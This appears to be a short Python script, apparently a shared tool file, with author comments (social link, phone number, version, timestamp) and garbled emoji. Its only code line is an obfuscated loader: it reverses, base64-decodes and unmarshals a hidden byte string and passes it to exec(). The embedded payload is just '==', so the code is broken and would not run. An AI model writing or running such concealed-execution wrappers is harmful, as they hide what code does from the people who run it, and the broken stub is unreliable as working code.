# ALHAMDULILLAH FO everything ‚ù§Ô∏èüòÖ
# FACEBOOK : https://www.facebook.com/rxashikyt22
# WHATSAPP: 01935091078
# VERSION: 10.1V
# Time : Wed Nov 22 11:10:14 2023
# -------------------------------
_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));exec((_)(b'=='))
